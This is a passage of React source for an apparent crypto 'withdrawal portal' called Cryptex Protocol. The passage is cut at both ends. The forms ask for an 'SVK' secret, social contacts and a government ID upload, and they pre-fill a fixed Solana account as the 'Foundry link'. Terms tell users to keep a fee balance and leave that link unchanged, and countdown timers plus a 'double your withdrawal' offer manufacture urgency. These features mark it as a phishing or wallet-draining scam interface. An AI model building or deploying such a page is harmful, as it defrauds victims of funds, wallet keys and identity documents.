      <div style={{ display: 'flex', gap: 10 }}>
        <BtnBack onClick={onBack} />
        <BtnNext onClick={checkBalanceAndNext} disabled={checking}>{checking ? 'VERIFYING...' : 'NEXT →'}</BtnNext>
      </div>
    </div>
  );
}

function StepSVK({ onNext, onBack }) {
  const [svk, setSvk] = useState('');
  const [error, setError] = useState('');
  const MAX = 256;
  const submit = () => {
    if (!svk.trim()) { setError('SVK is required'); return; }
    onNext({ svk: svk.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <FieldLabel>SVK VALUE</FieldLabel>
      <CryptoTextarea placeholder="Enter your SVK..." value={svk}
        onChange={e => { setSvk(e.target.value); setError(''); }}
        error={!!error} maxLength={MAX}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 14 }}>
        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
      </div>
    </div>
  );
}

function StepSocial({ onNext, onBack }) {
  const [social, setSocial] = useState('');
  const [error, setError] = useState('');
  const submit = () => {
    if (!social.trim()) { setError('Please enter at least one social link or handle'); return; }
    onNext({ socialLink: social.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 14 }}>
        <span style={{ fontSize: 18 }}>📡</span>
        <div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#9945ff', letterSpacing: 1 }}>SOCIAL CONTACT</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.35)' }}>X · Telegram · Discord · Instagram</div>
        </div>
      </div>
      <FieldLabel>WHERE CAN WE REACH YOU?</FieldLabel>
      <CryptoInput
        placeholder="Input social link here..."
        value={social}
        onChange={e => { setSocial(e.target.value); setError(''); }}
        error={!!error} autoFocus maxLength={200}
        onKeyDown={e => e.key === 'Enter' && submit()}
      />
      {error && <ErrMsg msg={error} />}
      <p style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.35)', marginTop: 6, marginBottom: 14 }}>
        e.g. @yourhandle · t.me/yourname · discord.gg/invite
      </p>
      <div style={{ display: 'flex', gap: 10 }}>
        <BtnBack onClick={onBack} /><BtnNext onClick={submit}>NEXT →</BtnNext>
      </div>
    </div>
  );
}

function StepFoundry({ onNext, onBack }) {
  const [link, setLink] = useState('https://solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const MAX = 256;
  const submit = async () => {
    if (!link.trim()) { setError('Foundry link is required'); return; }
    setLoading(true);
    onNext({ foundryLink: link.trim() });
  };
  return (
    <div style={{ padding: '22px 28px 28px' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, background: 'rgba(20,241,149,.05)', border: '1px solid rgba(20,241,149,.15)', borderRadius: 8, padding: '10px 12px', marginBottom: 14 }}>
        <span style={{ color: '#14f195', fontSize: 14, flexShrink: 0 }}>🔗</span>
        <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(20,241,149,.65)', wordBreak: 'break-all' }}>
          solscan.io/account/7wM6TyhDZMJSYojLbZWPcmkMu11xErKu6oeGJoHqtUgV
        </span>
      </div>
      <FieldLabel>FOUNDRY LINK</FieldLabel>
      <CryptoTextarea placeholder="https://solscan.io/account/..." value={link}
        onChange={e => { setLink(e.target.value); setError(''); }}
        error={!!error} maxLength={MAX}
      />
      {error && <ErrMsg msg={error} />}
      <div style={{ display: 'flex', gap: 10, marginTop: 14 }}>
        <BtnBack onClick={onBack} />
        <BtnNext green onClick={submit} disabled={loading}>{loading ? 'SUBMITTING...' : 'SUBMIT →'}</BtnNext>
      </div>
    </div>
  );
}

function StepSuccess() {
  return (
    <div style={{ padding: '32px 28px 36px', textAlign: 'center' }}>
      <div style={{ width: 72, height: 72, borderRadius: '50%', background: 'linear-gradient(135deg,rgba(20,241,149,.15),rgba(153,69,255,.15))', border: '2px solid #14f195', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', fontSize: 30, boxShadow: '0 0 36px rgba(20,241,149,.25)' }}>✓</div>
      <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 20, fontWeight: 700, background: 'linear-gradient(135deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 8 }}>SUBMISSION CONFIRMED</div>
      <p style={{ fontSize: 13, color: 'rgba(224,224,255,.4)', lineHeight: 1.8, marginBottom: 22 }}>Your entry has been recorded on-chain.<br />Withdrawals will be processed in order.</p>
      <div style={{ background: 'rgba(20,241,149,.05)', border: '1px solid rgba(20,241,149,.15)', borderRadius: 10, padding: 16 }}>
        <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: '#14f195', letterSpacing: 2 }}>WITHDRAWAL SCHEDULE</div>
        <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 22, fontWeight: 700, color: '#fff', marginTop: 4 }}>April 1 – 3, 2025</div>
      </div>
    </div>
  );
}

// ─── TERMS & CONDITIONS MODAL ────────────────────────────────────────────

function TermsModal({ onAccept, onClose }) {
  const [scrolled, setScrolled] = useState(false);

  const handleScroll = (e) => {
    const el = e.target;
    const atBottom = el.scrollHeight - el.scrollTop <= el.clientHeight + 40;
    if (atBottom) setScrolled(true);
  };

  return (
    <div onClick={e => { if (e.target === e.currentTarget) onClose(); }}
      style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.88)', backdropFilter: 'blur(12px)', padding: 20 }}>
      <div style={{ background: '#0c0c1a', border: '1px solid rgba(153,69,255,.35)', borderRadius: 20, width: '100%', maxWidth: 480, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both', display: 'flex', flexDirection: 'column', maxHeight: '90vh' }}>
        {/* Top accent */}
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#9945ff,#14f195,transparent)' }} />

        {/* Header */}
        <div style={{ padding: '28px 28px 20px', textAlign: 'center', flexShrink: 0 }}>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 8 }}>⬡ CRYPTEX PROTOCOL</div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 17, fontWeight: 700, color: '#fff', marginBottom: 6 }}>TERMS & CONDITIONS</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)' }}>Please read carefully before proceeding</div>
        </div>

        <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(153,69,255,.3),transparent)', margin: '0 28px', flexShrink: 0 }} />

        {/* Scrollable content */}
        <div onScroll={handleScroll} style={{ overflowY: 'auto', padding: '22px 28px', flexGrow: 1 }}>

          {/* Intro */}
          <div style={{ background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', borderRadius: 10, padding: '14px 16px', marginBottom: 20 }}>
            <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.6)', lineHeight: 1.8, margin: 0 }}>
              By accessing the Cryptex Protocol withdrawal portal, you confirm that you have read, understood, and agreed to the following terms. These terms govern your participation in the withdrawal program.
            </p>
          </div>

          {[
            {
              num: '01',
              title: 'Non-Refundable Wallet Interactions',
              body: 'All wallet interactions initiated through this portal are final and non-refundable. Once a transaction is submitted on-chain, it cannot be reversed. Please ensure all wallet details are correct before proceeding.',
              icon: '◎',
              color: '#9945ff',
            },
            {
              num: '02',
              title: 'Accuracy of Information',
              body: 'Participation in this program is entirely voluntary. By submitting your details, you confirm that all information provided — including your name, wallet addresses, and SVK — is accurate and belongs to you. Cryptex Protocol is not liable for losses resulting from incorrect information.',
              icon: '◈',
              color: '#14f195',
            },
            {
              num: '03',
              title: 'Foundry URL Integrity',
              body: 'Your Foundry URL is directly tied to your on-chain identity and withdrawal eligibility. Do not alter the pre-filled Foundry URL unless absolutely necessary. If you choose to modify it, you are fully responsible for ensuring the URL is correct. Incorrect URLs may result in disqualification.',
              icon: '🔗',
              color: '#9945ff',
            },
            {
              num: '04',
              title: 'Settlement & Disbursement Schedule',
              body: 'Withdrawals are processed on the 1st through 3rd of each month. Funds are expected to arrive in your registered wallet between the 5th and 7th of the same month, subject to network conditions and processing times.',
              icon: '⚡',
              color: '#14f195',
            },
            {
              num: '05',
              title: 'Prohibited Activity — Foundry Siphoning',
              body: 'Any attempt to extract, manipulate, or siphon funds beyond your allocated amount from the Foundry will result in the immediate and permanent termination of your Wormhole Protocol access. This action is strictly prohibited and may be subject to further consequences.',
              icon: '⚠',
              color: '#ff4545',
            },
            {
              num: '06',
              title: 'Community Participation',
              body: 'We encourage all participants to follow Winna on social media to stay updated on protocol announcements, settlement schedules, and community events.',
              icon: '⬡',
              color: '#9945ff',
            },
            {
              num: '07',
              title: 'Platform Endorsement',
              body: "Cryptex Protocol proudly recognizes Winna as the best casino and official community partner. Participants are encouraged to explore Winna's offerings as part of the broader ecosystem.",
              icon: '🏆',
              color: '#14f195',
            },
            {
              num: '08',
              title: 'Transaction Fees & Refund Policy',
              body: 'All applicable transaction fees will be fully refunded upon your scheduled disbursement. Please note that your wallet must maintain the minimum required fee balance at all times. Without the minimum fee, your wallet will be unable to interact with the Foundry or process any minor and major transactions. Ensure your wallet is sufficiently funded to avoid delays in your withdrawal.',
              icon: '💰',
              color: '#9945ff',
            },
          ].map((item) => (
            <div key={item.num} style={{ marginBottom: 16, padding: '14px 16px', background: 'rgba(15,15,26,.8)', border: '1px solid rgba(153,69,255,.15)', borderRadius: 10, borderLeft: `2px solid ${item.color}` }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
                <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: item.color, letterSpacing: 1 }}>{item.icon} §{item.num}</span>
                <span style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, fontWeight: 700, color: '#fff', letterSpacing: .5 }}>{item.title}</span>
              </div>
              <p style={{ fontFamily: "'Rajdhani',sans-serif", fontSize: 13, color: 'rgba(224,224,255,.55)', lineHeight: 1.8, margin: 0 }}>{item.body}</p>
            </div>
          ))}

          {/* Scroll prompt */}
          {!scrolled && (
            <div style={{ textAlign: 'center', padding: '12px 0', animation: 'fadeInUp .5s both' }}>
              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.5)', letterSpacing: 1 }}>↓ scroll to accept</div>
            </div>
          )}

          {/* Bottom padding so content clears button */}
          <div style={{ height: 8 }} />
        </div>

        {/* Accept button — fixed at bottom */}
        <div style={{ padding: '16px 28px 24px', flexShrink: 0, borderTop: '1px solid rgba(153,69,255,.12)', background: '#0c0c1a' }}>
          {!scrolled && (
            <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(153,69,255,.4)', textAlign: 'center', marginBottom: 10, letterSpacing: 1 }}>
              ↓ Scroll to the bottom to enable acceptance
            </div>
          )}
          <button
            onClick={scrolled ? onAccept : undefined}
            style={{
              width: '100%',
              fontFamily: "'Orbitron',sans-serif",
              fontSize: 11,
              letterSpacing: 2,
              padding: '14px 0',
              border: 'none',
              borderRadius: 9,
              background: scrolled
                ? 'linear-gradient(135deg,#9945ff,#7b2fd6)'
                : 'rgba(153,69,255,.15)',
              color: scrolled ? '#fff' : 'rgba(153,69,255,.35)',
              cursor: scrolled ? 'pointer' : 'not-allowed',
              transition: 'all .4s ease',
              boxShadow: scrolled ? '0 8px 28px rgba(153,69,255,.3)' : 'none',
            }}
            onMouseEnter={e => { if (scrolled) e.currentTarget.style.transform = 'translateY(-1px)'; }}
            onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
          >
            {scrolled ? 'I ACCEPT THE TERMS & CONDITIONS →' : 'READ ALL TERMS TO CONTINUE'}
          </button>
        </div>
      </div>
    </div>
  );
}

// ─── KYC UPLOAD MODAL ────────────────────────────────────────────────────

function KYCModal({ onNext, onClose }) {
  const [file, setFile] = useState(null);
  const [preview, setPreview] = useState(null);
  const [error, setError] = useState('');
  const [uploading, setUploading] = useState(false);
  const [dragOver, setDragOver] = useState(false);
  const inputRef = useRef(null);

  const handleFile = (f) => {
    if (!f) return;
    const allowed = ['image/jpeg','image/jpg','image/png','image/webp','application/pdf'];
    if (!allowed.includes(f.type)) { setError('Only JPG, PNG, WEBP or PDF files are accepted.'); return; }
    if (f.size > 10 * 1024 * 1024) { setError('File must be under 10MB.'); return; }
    setError('');
    setFile(f);
    if (f.type.startsWith('image/')) {
      const reader = new FileReader();
      reader.onload = (e) => setPreview(e.target.result);
      reader.readAsDataURL(f);
    } else {
      setPreview('pdf');
    }
  };

  const handleDrop = (e) => {
    e.preventDefault(); setDragOver(false);
    const f = e.dataTransfer.files[0];
    if (f) handleFile(f);
  };

  const submit = () => {
    if (!file) { setError('Please upload a valid government-issued ID to continue.'); return; }
    setUploading(true);
    setTimeout(() => { setUploading(false); onNext({ kycFile: file.name }); }, 1200);
  };

  return (
    <div onClick={e => { if (e.target === e.currentTarget) onClose(); }}
      style={{ position: 'fixed', inset: 0, zIndex: 200, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(4,3,13,.88)', backdropFilter: 'blur(12px)', padding: 20 }}>
      <div style={{ background: '#0c0c1a', border: '1px solid rgba(153,69,255,.35)', borderRadius: 20, width: '100%', maxWidth: 460, position: 'relative', overflow: 'hidden', animation: 'modalIn .4s cubic-bezier(.34,1.56,.64,1) both' }}>
        {/* Top accent */}
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 2, background: 'linear-gradient(90deg,transparent,#9945ff,#14f195,transparent)' }} />

        {/* Header */}
        <div style={{ padding: '28px 28px 0', textAlign: 'center' }}>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontWeight: 900, fontSize: 13, background: 'linear-gradient(90deg,#9945ff,#14f195)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: 8 }}>⬡ CRYPTEX PROTOCOL</div>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 17, fontWeight: 700, color: '#fff', marginBottom: 6 }}>IDENTITY VERIFICATION</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: 'rgba(224,224,255,.35)', marginBottom: 22 }}>KYC required before proceeding</div>
        </div>

        <div style={{ height: 1, background: 'linear-gradient(90deg,transparent,rgba(153,69,255,.3),transparent)', margin: '0 28px' }} />

        <div style={{ padding: '22px 28px 28px' }}>
          {/* Info banner */}
          <div style={{ display: 'flex', gap: 10, padding: '12px 14px', borderRadius: 9, background: 'rgba(153,69,255,.06)', border: '1px solid rgba(153,69,255,.18)', marginBottom: 20 }}>
            <span style={{ fontSize: 16, flexShrink: 0 }}>🪪</span>
            <div>
              <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, color: '#9945ff', letterSpacing: 1, marginBottom: 4 }}>ACCEPTED DOCUMENTS</div>
              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.4)', lineHeight: 1.8 }}>
                National ID · Passport · Driver&#39;s License<br />
                <span style={{ color: 'rgba(153,69,255,.5)' }}>JPG · PNG · WEBP · PDF · Max 10MB</span>
              </div>
            </div>
          </div>

          {/* Drop zone */}
          <div
            onDragOver={e => { e.preventDefault(); setDragOver(true); }}
            onDragLeave={() => setDragOver(false)}
            onDrop={handleDrop}
            onClick={() => inputRef.current?.click()}
            style={{
              border: `2px dashed ${dragOver ? '#14f195' : file ? 'rgba(20,241,149,.5)' : 'rgba(153,69,255,.3)'}`,
              borderRadius: 12,
              padding: '28px 20px',
              textAlign: 'center',
              cursor: 'pointer',
              transition: 'all .3s',
              background: dragOver ? 'rgba(20,241,149,.04)' : file ? 'rgba(20,241,149,.03)' : 'rgba(153,69,255,.03)',
              marginBottom: 14,
              position: 'relative',
              overflow: 'hidden',
            }}
          >
            <input
              ref={inputRef}
              type="file"
              accept="image/jpeg,image/jpg,image/png,image/webp,application/pdf"
              style={{ display: 'none' }}
              onChange={e => handleFile(e.target.files[0])}
            />

            {/* Preview or placeholder */}
            {preview && preview !== 'pdf' ? (
              <div>
                <img src={preview} alt="ID preview" style={{ maxHeight: 140, maxWidth: '100%', borderRadius: 8, marginBottom: 10, objectFit: 'contain' }} />
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#14f195' }}>✓ {file.name}</div>
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.3)', marginTop: 4 }}>Click to change</div>
              </div>
            ) : preview === 'pdf' ? (
              <div>
                <div style={{ fontSize: 40, marginBottom: 10 }}>📄</div>
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#14f195' }}>✓ {file.name}</div>
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.3)', marginTop: 4 }}>Click to change</div>
              </div>
            ) : (
              <div>
                <div style={{ fontSize: 36, marginBottom: 12 }}>📁</div>
                <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 11, color: 'rgba(153,69,255,.8)', letterSpacing: 1, marginBottom: 6 }}>DRAG & DROP OR CLICK TO UPLOAD</div>
                <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.3)' }}>Your government-issued ID</div>
              </div>
            )}
          </div>

          {error && (
            <div style={{ padding: '10px 12px', borderRadius: 7, background: 'rgba(255,69,69,.06)', border: '1px solid rgba(255,69,69,.25)', marginBottom: 14 }}>
              <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, color: '#ff4545' }}>⚠ {error}</div>
            </div>
          )}

          {/* Privacy note */}
          <div style={{ display: 'flex', alignItems: 'flex-start', gap: 8, padding: '10px 12px', borderRadius: 8, background: 'rgba(20,241,149,.04)', border: '1px solid rgba(20,241,149,.1)', marginBottom: 20 }}>
            <span style={{ color: '#14f195', fontSize: 12, flexShrink: 0, marginTop: 1 }}>🔒</span>
            <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(20,241,149,.5)', lineHeight: 1.7 }}>Your document is encrypted and used solely for identity verification purposes. We do not share your data with third parties.</span>
          </div>

          {/* Buttons */}
          <div style={{ display: 'flex', gap: 10 }}>
            <button onClick={onClose} style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px', padding: '13px 20px', border: '1px solid rgba(153,69,255,.3)', borderRadius: 8, background: 'transparent', color: 'rgba(153,69,255,.7)', cursor: 'pointer', transition: 'all .25s' }}
              onMouseEnter={e => { e.currentTarget.style.background = 'rgba(153,69,255,.1)'; }}
              onMouseLeave={e => { e.currentTarget.style.background = 'transparent'; }}
            >← BACK</button>
            <button onClick={submit} disabled={uploading} style={{
              flex: 1, fontFamily: "'Orbitron',sans-serif", fontSize: 10, letterSpacing: '1.5px',
              padding: '13px 0', border: 'none', borderRadius: 8,
              background: 'linear-gradient(135deg,#9945ff,#7b2fd6)',
              color: '#fff', cursor: uploading ? 'not-allowed' : 'pointer',
              opacity: uploading ? .7 : 1, transition: 'all .3s',
            }}
              onMouseEnter={e => { if (!uploading) e.currentTarget.style.transform = 'translateY(-1px)'; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; }}
            >
              {uploading ? 'UPLOADING...' : 'CONTINUE →'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─── COUNTDOWN PILL ──────────────────────────────────────────────────────────

function CountdownPill() {
  const [timeLeft, setTimeLeft] = useState({ d: 0, h: 0, m: 0, s: 0 });
  const [expanded, setExpanded] = useState(false);
  const [urgent, setUrgent] = useState(false);

  useEffect(() => {
    function getNextCutoff() {
      // Silently anchored to UTC+8, 21:00 on the 19th each month
      const OFFSET_MS = 8 * 60 * 60 * 1000;
      const nowInZone = new Date(Date.now() + OFFSET_MS);

      const year = nowInZone.getUTCFullYear();
      const month = nowInZone.getUTCMonth();
      const day = nowInZone.getUTCDate();
      const hour = nowInZone.getUTCHours();
      const minute = nowInZone.getUTCMinutes();
      const second = nowInZone.getUTCSeconds();

      // Build target: 19th of current month at 21:00:00 in zone
      let targetYear = year;
      let targetMonth = month;

      // Check if we are past 19th 21:00:00 this month
      const pastCutoff =
        day > 19 ||
        (day === 19 && hour > 21) ||
        (day === 19 && hour === 21 && minute > 30) ||
        (day === 19 && hour === 21 && minute === 30 && second > 0);

      if (pastCutoff) {
        targetMonth += 1;
        if (targetMonth > 11) { targetMonth = 0; targetYear += 1; }
      }

      // Target in zone as UTC epoch ms: Date.UTC treats args as UTC
      // so subtract the offset to get the real UTC moment
      const targetUTC = Date.UTC(targetYear, targetMonth, 19, 21, 30, 0) - OFFSET_MS;
      return targetUTC;
    }

    function tick() {
      const target = getNextCutoff();
      const diff = Math.max(0, target - Date.now());
      const d = Math.floor(diff / 86400000);
      const h = Math.floor((diff % 86400000) / 3600000);
      const m = Math.floor((diff % 3600000) / 60000);
      const s = Math.floor((diff % 60000) / 1000);
      setTimeLeft({ d, h, m, s });
      setUrgent(diff > 0 && diff < 86400000);
    }

    tick();
    const iv = setInterval(tick, 1000);
    return () => clearInterval(iv);
  }, []);

  const pad = n => String(n).padStart(2, '0');
  const color = urgent ? '#ff4545' : '#14f195';
  const borderColor = urgent ? 'rgba(255,69,69,.35)' : 'rgba(20,241,149,.25)';

  const timeStr = timeLeft.d > 0
    ? `${timeLeft.d}d ${pad(timeLeft.h)}h ${pad(timeLeft.m)}m`
    : `${pad(timeLeft.h)}h ${pad(timeLeft.m)}m ${pad(timeLeft.s)}s`;

  return (
    <div
      onClick={() => setExpanded(e => !e)}
      style={{
        position: 'fixed',
        bottom: 28,
        left: 'calc(50% - 10px)',
        transform: 'translateX(-100%)',
        zIndex: 50,
        cursor: 'pointer',
        transition: 'all .4s cubic-bezier(.34,1.56,.64,1)',
        userSelect: 'none',
      }}
    >
      <div style={{
        display: 'flex',
        alignItems: 'center',
        gap: expanded ? 10 : 8,
        background: 'rgba(10,10,20,.92)',
        border: `1px solid ${borderColor}`,
        borderRadius: 50,
        padding: expanded ? '8px 18px' : '6px 14px',
        backdropFilter: 'blur(16px)',
        boxShadow: `0 4px 24px ${urgent ? 'rgba(255,69,69,.2)' : 'rgba(20,241,149,.15)'}, 0 0 0 1px rgba(255,255,255,.04)`,
        transition: 'all .4s cubic-bezier(.34,1.56,.64,1)',
        whiteSpace: 'nowrap',
      }}>
        {/* Pulsing dot */}
        <div style={{
          width: urgent ? 7 : 6,
          height: urgent ? 7 : 6,
          borderRadius: '50%',
          background: color,
          boxShadow: `0 0 8px ${color}`,
          animation: 'blink 1.4s ease-in-out infinite',
          flexShrink: 0,
        }} />

        {expanded ? (
          <>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
              <span style={{
                fontFamily: "'Orbitron',sans-serif",
                fontSize: 9,
                letterSpacing: '1.5px',
                color: 'rgba(224,224,255,.4)',
                textTransform: 'uppercase',
              }}>Countdown to Cutoff</span>
              <span style={{
                fontFamily: "'Share Tech Mono',monospace",
                fontSize: 13,
                color,
                letterSpacing: '1px',
                fontWeight: 600,
              }}>{timeStr}</span>
            </div>
            <div style={{
              fontFamily: "'Share Tech Mono',monospace",
              fontSize: 9,
              color: 'rgba(224,224,255,.25)',
              borderLeft: '1px solid rgba(153,69,255,.2)',
              paddingLeft: 10,
              lineHeight: 1.6,
            }}>
              <div>Resets 20th</div>

            </div>
          </>
        ) : (
          <>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 0 }}>
              <span style={{
                fontFamily: "'Orbitron',sans-serif",
                fontSize: 8,
                letterSpacing: '1px',
                color: 'rgba(224,224,255,.35)',
              }}>CUTOFF</span>
              <span style={{
                fontFamily: "'Share Tech Mono',monospace",
                fontSize: 11,
                color,
                letterSpacing: '.5px',
                fontWeight: 600,
              }}>{timeStr}</span>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

// ─── DOUBLE TROUBLE PILL ─────────────────────────────────────────────────────

function DoubleTroublePill() {
  const [timeLeft, setTimeLeft] = useState({ h: 0, m: 0, s: 0 });
  const [expanded, setExpanded] = useState(false);

  useEffect(() => {
    function getTarget() {
      const OFFSET_MS = 8 * 60 * 60 * 1000;
      const nowInZone = new Date(Date.now() + OFFSET_MS);

      const year  = nowInZone.getUTCFullYear();
      const month = nowInZone.getUTCMonth();
      const day   = nowInZone.getUTCDate();
      const hour  = nowInZone.getUTCHours();
      const min   = nowInZone.getUTCMinutes();
      const sec   = nowInZone.getUTCSeconds();

      // Has 23:15:00 already passed today in zone?
      const pastToday =
        hour > 23 ||
        (hour === 23 && min > 15) ||
        (hour === 23 && min === 15 && sec > 0);

      let y = year, mo = month, d = day;
      if (pastToday) {
        // Move to tomorrow
        const tomorrow = new Date(Date.UTC(year, month, day + 1));
        y  = tomorrow.getUTCFullYear();
        mo = tomorrow.getUTCMonth();
        d  = tomorrow.getUTCDate();
      }

      return Date.UTC(y, mo, d, 23, 15, 0) - OFFSET_MS;
    }

    function tick() {
      const diff = Math.max(0, getTarget() - Date.now());
      const h = Math.floor(diff / 3600000);
      const m = Math.floor((diff % 3600000) / 60000);
      const s = Math.floor((diff % 60000) / 1000);
      setTimeLeft({ h, m, s, diff });
    }

    tick();
    const iv = setInterval(tick, 1000);
    return () => clearInterval(iv);
  }, []);

  const pad = n => String(n).padStart(2, '0');
  const expired = timeLeft.h === 0 && timeLeft.m === 0 && timeLeft.s === 0;
  const totalSecs = timeLeft.h * 3600 + timeLeft.m * 60 + timeLeft.s;
  const hot = totalSecs < 3600 && !expired; // last hour = red hot
  const color = expired ? 'rgba(153,69,255,.4)' : hot ? '#ff4545' : '#f59e0b';
  const borderColor = expired ? 'rgba(153,69,255,.2)' : hot ? 'rgba(255,69,69,.4)' : 'rgba(245,158,11,.35)';
  const glow = expired ? 'none' : hot ? '0 4px 20px rgba(255,69,69,.25)' : '0 4px 20px rgba(245,158,11,.2)';
  const timeStr = expired ? 'EXPIRED' : `${pad(timeLeft.h)}:${pad(timeLeft.m)}:${pad(timeLeft.s)}`;

  return (
    <div onClick={() => setExpanded(e => !e)} style={{
      position: 'fixed',
      bottom: 28,
      left: 'calc(50% + 10px)',
      transform: 'none',
      zIndex: 50,
      userSelect: 'none',
      cursor: 'pointer',
    }}>
      {expanded && (
        <div style={{
          position: 'absolute',
          bottom: '110%',
          left: '50%',
          transform: 'translateX(-50%)',
          background: 'rgba(10,10,20,.97)',
          border: `1px solid ${borderColor}`,
          borderRadius: 12,
          padding: '12px 16px',
          width: 240,
          backdropFilter: 'blur(16px)',
          boxShadow: `0 8px 32px rgba(0,0,0,.5)`,
          marginBottom: 8,
          animation: 'fadeInUp .2s ease both',
        }}>
          <div style={{ fontFamily: "'Orbitron',sans-serif", fontSize: 9, color, letterSpacing: '1.5px', marginBottom: 6 }}>⚡ DOUBLE TROUBLE EVENT</div>
          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color: 'rgba(224,224,255,.6)', lineHeight: 1.8 }}>
            (Anti-depegging) We are draining the pool fast since there are news of possible depegging of stables. Claim double of your withdrawals before time runs out.
          </div>
          <div style={{ marginTop: 8, fontFamily: "'Share Tech Mono',monospace", fontSize: 10, color, fontWeight: 600 }}>
            Expires in: {timeStr}
          </div>
        </div>
      )}
      <div style={{
        display: 'flex',
        alignItems: 'center',
        gap: 8,
        background: 'rgba(10,10,20,.92)',
        border: `1px solid ${borderColor}`,
        borderRadius: 50,
        padding: '6px 14px',
        backdropFilter: 'blur(16px)',
        boxShadow: `${glow}, 0 0 0 1px rgba(255,255,255,.04)`,
        whiteSpace: 'nowrap',
        transition: 'all .4s ease',
      }}>
        {/* Flame dot */}
        <div style={{
          width: 6, height: 6, borderRadius: '50%',
          background: color,
          boxShadow: `0 0 8px ${color}`,
          animation: expired ? 'none' : 'blink 0.9s ease-in-out infinite',
          flexShrink: 0,
        }} />
        <div style={{ display: 'flex', flexDirection: 'column', gap: 0 }}>
          <span style={{
            fontFamily: "'Orbitron',sans-serif",
            fontSize: 8,
            letterSpacing: '1px',
            color,
            opacity: .85,
          }}>2x DOUBLE TROUBLE</span>
          <span style={{
            fontFamily: "'Share Tech Mono',monospace",
            fontSize: 9,
            color: 'rgba(224,224,255,.35)',
            letterSpacing: '.3px',
            lineHeight: 1.4,
            maxWidth: 160,
            whiteSpace: 'normal',
          }}>Anti-depegging · draining pool fast</span>
          <span style={{
            fontFamily: "'Share Tech Mono',monospace",
            fontSize: 11,
            color,
            letterSpacing: '.5px',
            fontWeight: 600,
          }}>{timeStr}</span>
        </div>
      </div>
    </div>
  );
}

// ─── POOL ALLOCATION MODAL ───────────────────────────────────────────────────

function PoolModal({ onClose }) {
  const [poolCode, setPoolCode] = useState('');
  const [doubleCode, setDoubleCode] = useState('');
  const [stage, setStage] = useState('code'); // 'code' | 'result'
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [codeError, setCodeError] = useState('');
  const [doubleError, setDoubleError] = useState('');
  const [doubleApplied, setDoubleApplied] = useState(false);
  const [doubleLoading, setDoubleLoading] = useState(false);

  const submitCode = async () => {
